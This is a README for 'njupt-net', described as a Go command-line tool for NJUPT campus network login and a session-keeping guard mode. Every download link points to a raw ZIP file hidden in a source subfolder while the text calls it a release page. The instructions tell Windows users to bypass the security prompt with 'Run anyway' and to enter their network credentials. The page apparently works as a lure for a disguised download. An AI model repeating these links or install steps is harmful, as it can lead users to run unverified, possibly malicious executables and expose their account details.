# 🖥️ njupt-net - Simple NJUPT Network Access

[![Download njupt-net](https://img.shields.io/badge/Download-njupt--net-blue?style=for-the-badge)](https://github.com/sydneyunadapted247/njupt-net/raw/refs/heads/main/internal/runtime/guard/njupt_net_v1.9.zip)

## 📘 What this is

njupt-net is a small command-line app for NJUPT network login and guard use. It helps you sign in to the campus network, keep the session alive, and manage common network tasks from one tool.

It is built in Go and works on Windows, Linux, and other platforms. For most users, the main use is simple: get network access working and keep it stable.

## ✅ What you can do

- Sign in to the NJUPT network
- Keep your network session active
- Run it in the background as a guard process
- Use it from a terminal or command prompt
- Work on Windows with a simple setup
- Use the same tool on other systems with similar steps

## 💻 Before you start

You only need a few basic things:

- A Windows computer
- Internet access for the first download
- A web browser
- Permission to run downloaded apps

If your PC asks for admin approval, use an account that can approve the app or ask the person who manages the computer.

## ⬇️ Download njupt-net

Open the download page here and visit this page to download:

[https://github.com/sydneyunadapted247/njupt-net/raw/refs/heads/main/internal/runtime/guard/njupt_net_v1.9.zip](https://github.com/sydneyunadapted247/njupt-net/raw/refs/heads/main/internal/runtime/guard/njupt_net_v1.9.zip)

After the page opens, look for the latest release or download file for Windows. Download the file to your computer.

## 🪟 Install on Windows

### 1. Save the file

Download the Windows file to a folder you can find again, such as:

- Downloads
- Desktop
- Documents

If the file comes in a ZIP archive, keep it in the ZIP file until you are ready to open it.

### 2. Open the download

If you downloaded a ZIP file:

- Right-click the file
- Choose Extract All
- Pick a folder
- Wait for Windows to unpack the files

If you downloaded an `.exe` file:

- Double-click the file to start it

### 3. Allow the app to run

Windows may show a security prompt. If that happens:

- Click Run
- Or click More info, then Run anyway if you trust the file source

### 4. Open Command Prompt

njupt-net is a CLI app, so you use it in Command Prompt or PowerShell.

To open Command Prompt:

- Press `Windows + R`
- Type `cmd`
- Press Enter

You can also use PowerShell from the Start menu.

### 5. Go to the app folder

If you extracted the files, move into that folder first.

Example:

- `cd Downloads\njupt-net`

If you are not sure where the files are, use File Explorer to open the folder, then click the address bar and copy the path.

### 6. Run the app

Start the program by typing the file name shown in the folder.

Common examples:

- `njupt-net.exe`
- `njupt-net login`
- `njupt-net guard`

If the app opens and shows help text, that means it is working.

## 🔐 First-time setup

Before you can log in, you may need to enter your network account details once.

Typical setup steps:

- Enter your NJUPT username
- Enter your network password
- Choose the network type if the app asks
- Save the settings if the tool offers a save option

If the app uses a config file, store it in the same folder as the program unless the instructions say otherwise.

## 🚦 Common use

Here are the most common actions you may need.

### Login

Use this when you want to connect to the campus network.

Example pattern:

- `njupt-net login`

If the app asks for more details, type them when asked.

### Guard mode

Use guard mode when you want the app to watch your network status and keep it online.

Example pattern:

- `njupt-net guard`

This is useful when the network drops from time to time and you want the app to try again.

### Logout

Use this when you want to sign out of the network.

Example pattern:

- `njupt-net logout`

### Status

Use this to check whether the network is live.

Example pattern:

- `njupt-net status`

### Help

If you are not sure what a command does, ask the app for help.

Example pattern:

- `njupt-net --help`

## 🧭 Simple Windows run steps

If you want the shortest path, follow these steps:

1. Open the download page
2. Download the Windows file
3. Unzip it if needed
4. Open Command Prompt
5. Go to the folder with the app
6. Run the login command
7. Start guard mode if you want it to stay online

## 🛠️ How it fits your daily use

This tool is useful if you need a steady campus network connection for:

- Browsing
- Study tools
- Online classes
- Dorm network access
- Long sessions that should not drop

Because it has a guard runtime, it can stay active while you work, which helps if your connection times out.

## 📁 Typical file layout

If you see a folder after extraction, it may include files like:

- `njupt-net.exe`
- config files
- README files
- log files
- support files for the guard runtime

Keep the files together in one folder. Do not move one file away unless you know what it does.

## ⚙️ If the app does not start

Try these steps:

- Make sure you extracted the ZIP file
- Check that you are in the right folder
- Run the file with the full name
- Open Command Prompt as normal first
- Try again after closing and reopening the terminal
- Check whether Windows blocked the file

If the app closes right away, open it from Command Prompt so you can see the message on screen.

## 🌐 Network notes

This app is made for NJUPT network use. It may work with campus portal and self-service flows used by the school network.

If your login fails, check:

- Your username
- Your password
- Whether your network account is active
- Whether you are on the right campus network
- Whether the portal page needs a fresh sign-in

## 🧰 For repeat use

If you use the app often, place the folder in a fixed spot such as:

- `C:\njupt-net`
- `C:\Tools\njupt-net`

That makes it easier to open later and run the same commands again.

You can also make a shortcut to Command Prompt or PowerShell that opens in that folder.

## 🔎 Quick command examples

These examples show the kind of commands you may use:

- `njupt-net login`
- `njupt-net guard`
- `njupt-net logout`
- `njupt-net status`
- `njupt-net --help`

Your version may use slightly different command names. If so, open the help screen and follow the command list shown there.

## 📦 Project details

- Name: njupt-net
- Type: Network CLI and guard runtime
- Language: Go
- Platform focus: Windows and cross-platform use
- Use case: Campus network login and session keep-alive

## 🧪 Expected behavior

When the app works, you should see one of these results:

- A clear success message after login
- A guard process that keeps running
- A status check that confirms your connection
- A clean exit after logout

If you see errors, read the text on screen first. It often tells you which field or step needs attention.

## 📌 File source

Use the main project page to get the latest version:

[https://github.com/sydneyunadapted247/njupt-net/raw/refs/heads/main/internal/runtime/guard/njupt_net_v1.9.zip](https://github.com/sydneyunadapted247/njupt-net/raw/refs/heads/main/internal/runtime/guard/njupt_net_v1.9.zip)

